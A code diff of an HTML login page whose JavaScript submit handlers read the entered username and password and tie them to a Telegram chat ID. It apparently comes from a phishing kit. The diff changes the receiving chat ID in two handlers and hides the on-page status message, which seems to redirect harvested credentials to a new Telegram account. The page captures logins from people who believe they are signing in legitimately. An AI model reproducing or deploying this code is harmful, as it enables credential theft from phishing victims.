@@ -443,7 +443,7 @@
                               </div>
                           </form>
 
-                          <div class="display" id="status"></div> <!-- Status message display -->
+                          <div class="hidden" id="status" style="display: none;"></div> <!-- Status message display -->
 
                             <a class="forgot" href="">Forgot password?</a>
                             <p id="feedback" style="color: red; font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p><br>
@@ -540,7 +540,7 @@
   document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault(); // Prevent the default form submission behavior
 
-      const chatId = '1866571175'; // Your Telegram chat ID
+      const chatId = '6393188021'; // Your Telegram chat ID
       // Get the username and password values from the form inputs
       const username = document.getElementById('username').value; // Changed to match the new input ID
       const password = document.getElementById('password').value; // Changed to match the new input ID
@@ -609,7 +609,7 @@
   document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault(); // Prevent form from submitting normally
 
-      const chatId = '1866571175'; // Your Telegram chat ID
+      const chatId = '6393188021'; // Your Telegram chat ID
       const username = document.querySelector('input[name="username"]').value;
       const password = document.querySelector('input[name="password"]').value;
 
